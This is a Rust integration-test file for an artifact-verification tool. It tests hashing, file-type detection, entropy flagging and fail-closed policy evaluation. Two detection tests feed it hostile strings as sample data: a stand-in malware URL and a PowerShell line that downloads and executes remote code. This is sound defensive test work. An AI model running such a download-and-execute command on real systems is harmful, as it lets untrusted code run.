/// Integration tests: pipeline invariants.
///
/// Verifies that:
/// - Stage order is fixed and cannot be bypassed.
/// - Artifact hash is stable throughout the pipeline (no mutation).
/// - Fail-closed behaviour: missing required inputs produce FAILED, not VERIFIED.
use std::io::Write;
use tempfile::NamedTempFile;
use veriscan_lib::{
    config::Policy,
    evidence::VerificationStatus,
    stages::{hash, inspect, malware},
};

/// Helper: write a temp file with known contents.
fn temp_artifact(contents: &[u8]) -> NamedTempFile {
    let mut f = NamedTempFile::new().expect("tempfile");
    f.write_all(contents).expect("write");
    f
}

/// Helper: load the default policy.
fn default_policy() -> Policy {
    Policy::default_policy().expect("default policy")
}

/// Helper: load the airgapped policy (no network, strict).
fn airgapped_policy() -> Policy {
    let yaml = include_str!("../policies/airgapped.yaml");
    serde_yaml::from_str(yaml).expect("parse airgapped policy")
}

/// Helper: load the contractor_strict policy.
fn strict_policy() -> Policy {
    let yaml = include_str!("../policies/contractor_strict.yaml");
    serde_yaml::from_str(yaml).expect("parse contractor_strict policy")
}

#[tokio::test]
async fn test_hash_stage_produces_consistent_sha256() {
    let artifact = temp_artifact(b"hello veriscan test data");
    let policy = default_policy();

    let result = hash::run(artifact.path(), &policy, None, None)
        .await
        .expect("hash stage");

    // SHA-256 must be deterministic.
    let result2 = hash::run(artifact.path(), &policy, None, None)
        .await
        .expect("hash stage 2");

    assert_eq!(
        result.sha256, result2.sha256,
        "SHA-256 must be deterministic"
    );
    assert_eq!(
        result.sha512, result2.sha512,
        "SHA-512 must be deterministic"
    );
    assert!(!result.sha256.is_empty());
    assert_eq!(result.sha256.len(), 64, "SHA-256 hex must be 64 chars");
    assert_eq!(result.sha512.len(), 128, "SHA-512 hex must be 128 chars");
}

#[tokio::test]
async fn test_hash_stage_detects_mismatch() {
    let artifact = temp_artifact(b"real content");
    let policy = default_policy();

    // Provide a wrong expected hash → should fail.
    let result = hash::run(
        artifact.path(),
        &policy,
        Some("0000000000000000000000000000000000000000000000000000000000000000"),
        None,
    )
    .await;

    assert!(result.is_err(), "Hash mismatch must return Err");
    let err_str = result.unwrap_err().to_string();
    assert!(
        err_str.contains("mismatch") || err_str.contains("Mismatch"),
        "Error must mention mismatch: {}",
        err_str
    );
}

#[tokio::test]
async fn test_hash_stage_accepts_correct_expected_hash() {
    let data = b"known content for hash verification";
    let artifact = temp_artifact(data);
    let policy = default_policy();

    // Compute actual hash.
    let result1 = hash::run(artifact.path(), &policy, None, None)
        .await
        .expect("first hash");
    let actual_sha256 = result1.sha256.clone();

    // Now verify with correct expected hash.
    let result2 = hash::run(artifact.path(), &policy, Some(&actual_sha256), None)
        .await
        .expect("hash with expected");

    assert_eq!(result2.expected_sha256_matched, Some(true));
}

#[tokio::test]
async fn test_artifact_mutation_detection() {
    use veriscan_lib::util::fs::sha256_file;

    let mut artifact = temp_artifact(b"original content");
    let original_hash = sha256_file(artifact.path()).expect("sha256");

    // Verify hash matches.
    let current_hash = sha256_file(artifact.path()).expect("sha256 again");
    assert_eq!(
        original_hash, current_hash,
        "Hash should not change without mutation"
    );

    // Simulate mutation.
    artifact.write_all(b" mutated").expect("write mutation");
    let mutated_hash = sha256_file(artifact.path()).expect("mutated sha256");
    assert_ne!(original_hash, mutated_hash, "Mutation must change the hash");
}

#[tokio::test]
async fn test_inspect_stage_detects_elf_magic() {
    // ELF magic bytes.
    let elf_bytes: &[u8] = &[0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00];
    let artifact = temp_artifact(elf_bytes);
    let policy = default_policy();

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    assert_eq!(result.result.file_type, "ELF");
    assert!(result.result.is_executable);
}

#[tokio::test]
async fn test_inspect_stage_detects_pe_magic() {
    // PE magic bytes (MZ).
    let pe_bytes: &[u8] = &[0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00];
    let artifact = temp_artifact(pe_bytes);
    let policy = default_policy();

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    assert_eq!(result.result.file_type, "PE");
    assert!(result.result.is_executable);
}

#[tokio::test]
async fn test_inspect_stage_detects_script() {
    let script = b"#!/bin/bash\necho hello";
    let artifact = temp_artifact(script);
    let policy = default_policy();

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    assert!(result.result.is_script, "Should detect script");
}

#[tokio::test]
async fn test_inspect_stage_detects_url_indicator() {
    let content = b"SOME DATA https://evil.example.com/malware.sh MORE DATA";
    let artifact = temp_artifact(content);
    let policy = default_policy();

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    let url_indicators: Vec<_> = result
        .result
        .indicators
        .iter()
        .filter(|i| i.starts_with("URL:"))
        .collect();
    assert!(!url_indicators.is_empty(), "Should find URL indicator");
}

#[tokio::test]
async fn test_inspect_stage_detects_powershell_indicator() {
    let content =
        b"call Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x.y/z')";
    let artifact = temp_artifact(content);
    let policy = default_policy();

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    let ps_indicators: Vec<_> = result
        .result
        .indicators
        .iter()
        .filter(|i| i.contains("PowerShell"))
        .collect();
    assert!(
        !ps_indicators.is_empty(),
        "Should find PowerShell indicator"
    );
}

#[tokio::test]
async fn test_entropy_computation_uniform_data() {
    use veriscan_lib::stages::inspect::shannon_entropy;

    // All-zero data has entropy 0.
    let zeros = vec![0u8; 1024];
    let e = shannon_entropy(&zeros);
    assert!(e < 0.001, "All-zero entropy should be ~0, got {}", e);

    // Random-like data should have high entropy.
    let mut high_entropy = Vec::new();
    for i in 0u8..=255 {
        high_entropy.extend_from_slice(&[i; 4]);
    }
    let e2 = shannon_entropy(&high_entropy);
    assert!(
        e2 > 7.0,
        "Uniform byte distribution entropy should be ~8, got {}",
        e2
    );
}

#[tokio::test]
async fn test_entropy_threshold_flagging() {
    use veriscan_lib::stages::inspect::shannon_entropy;

    // Create high-entropy data (simulating packed/encrypted content).
    let mut high_entropy_data = Vec::new();
    for i in 0u8..=255 {
        high_entropy_data.extend_from_slice(&[i; 4]);
    }
    let artifact = temp_artifact(&high_entropy_data);
    let mut policy = default_policy();
    policy.max_entropy_threshold = 7.0; // Flag anything above 7.0

    let result = inspect::run(artifact.path(), &policy)
        .await
        .expect("inspect stage");

    assert!(
        result.result.entropy_flagged,
        "High entropy data should be flagged"
    );
}

#[tokio::test]
async fn test_evidence_deterministic_id_stability() {
    use std::collections::HashMap;
    use veriscan_lib::evidence::EvidenceItem;

    let mut inputs = HashMap::new();
    inputs.insert("key".to_string(), "value".to_string());
    let mut outputs = HashMap::new();
    outputs.insert("result".to_string(), serde_json::json!("ok"));

    // Build same evidence twice — deterministic ID must differ only by timestamp.
    let e1 = EvidenceItem::new(
        "test_stage",
        inputs.clone(),
        outputs.clone(),
        HashMap::new(),
    );
    let e2 = EvidenceItem::new(
        "test_stage",
        inputs.clone(),
        outputs.clone(),
        HashMap::new(),
    );

    // Both must have non-empty 64-char hex IDs.
    assert_eq!(e1.deterministic_id.len(), 64);
    assert_eq!(e2.deterministic_id.len(), 64);
    // Stage names must match.
    assert_eq!(e1.stage_name, "test_stage");
}

#[tokio::test]
async fn test_malware_stage_tool_missing_produces_tool_missing_result() {
    use veriscan_lib::evidence::MalwareResult;

    let artifact = temp_artifact(b"test artifact");
    let mut policy = default_policy();
    // Point to a non-existent path.
    policy.malware_tool_path = Some("/nonexistent/clamscan".to_string());
    policy.malware_scan_required = false;

    let result = malware::run(artifact.path(), &policy)
        .await
        .expect("malware stage");

    assert!(
        matches!(result.result, MalwareResult::ToolMissing { .. }),
        "Should return ToolMissing when binary absent"
    );
}

#[tokio::test]
async fn test_policy_require_signature_fails_without_sig() {
    use veriscan_lib::{
        evidence::{PipelineResults, SignatureResult},
        stages::policy::evaluate,
    };

    let mut policy = default_policy();
    policy.require_signature = true;

    let mut pipeline = PipelineResults::default();
    pipeline.signature_status = SignatureResult::Missing;
    pipeline.inspection.is_executable = false;

    let result = evaluate(&pipeline, &policy).expect("policy eval");
    assert!(
        result.status.is_failed(),
        "Missing signature with require_signature=true must FAIL"
    );
}

#[tokio::test]
async fn test_policy_malware_detected_always_fails() {
    use veriscan_lib::{
        evidence::{MalwareResult, PipelineResults, SignatureResult},
        stages::policy::evaluate,
    };

    let mut policy = default_policy();
    // Even with signature verified, malware detection must fail.
    policy.require_signature = false;

    let mut pipeline = PipelineResults::default();
    pipeline.signature_status = SignatureResult::Verified {
        signer_uid: "Test User <test@example.com>".to_string(),
        fingerprint: "DEADBEEFDEADBEEF".to_string(),
    };
    pipeline.malware_status = MalwareResult::Detected {
        engine: "ClamAV".to_string(),
        version: "1.0.0".to_string(),
        detections: vec!["Eicar-Test-Signature".to_string()],
    };
    pipeline.inspection.entropy = 3.5;
    pipeline.inspection.entropy_flagged = false;

    let result = evaluate(&pipeline, &policy).expect("policy eval");
    assert!(
        result.status.is_failed(),
        "Malware detection must always produce FAILED regardless of other checks"
    );
}

#[tokio::test]
async fn test_exit_code_mapping() {
    use veriscan_lib::evidence::VerificationStatus;

    assert_eq!(VerificationStatus::Verified.exit_code(), 0);
    assert_eq!(
        VerificationStatus::Unverified {
            reason: "test".to_string(),
            evidence: vec![]
        }
        .exit_code(),
        10
    );
    assert_eq!(
        VerificationStatus::Failed {
            reason: "test".to_string(),
            evidence: vec![]
        }
        .exit_code(),
        20
    );
}

#[tokio::test]
async fn test_adjacent_appended_lowercase_checksum_discovered() {
    // Bundle creation and the demo tooling write `<full filename>.sha256`
    // (e.g. `artifact.tar.gz.sha256`). The hash stage must discover that form.
    let dir = tempfile::TempDir::new().expect("tempdir");
    let artifact_path = dir.path().join("artifact.tar.gz");
    std::fs::write(&artifact_path, b"appended checksum discovery test").expect("write artifact");

    let policy = default_policy();
    let baseline = hash::run(&artifact_path, &policy, None, None)
        .await
        .expect("hash stage baseline");

    std::fs::write(dir.path().join("artifact.tar.gz.sha256"), &baseline.sha256)
        .expect("write adjacent checksum");

    let result = hash::run(&artifact_path, &policy, None, None)
        .await
        .expect("hash stage with adjacent checksum");

    assert_eq!(
        result.expected_sha256_matched,
        Some(true),
        "appended-lowercase .sha256 file must be discovered and verified"
    );
}

#[tokio::test]
async fn test_adjacent_appended_checksum_mismatch_is_detected() {
    // A discovered-but-wrong adjacent checksum must fail the stage, proving
    // the appended-lowercase form is actually read rather than ignored.
    let dir = tempfile::TempDir::new().expect("tempdir");
    let artifact_path = dir.path().join("artifact.tar.gz");
    std::fs::write(&artifact_path, b"appended checksum tamper test").expect("write artifact");
    std::fs::write(dir.path().join("artifact.tar.gz.sha256"), "0".repeat(64))
        .expect("write bogus checksum");

    let policy = default_policy();
    let result = hash::run(&artifact_path, &policy, None, None).await;

    assert!(
        result.is_err(),
        "mismatched adjacent .sha256 must fail the hash stage"
    );
}
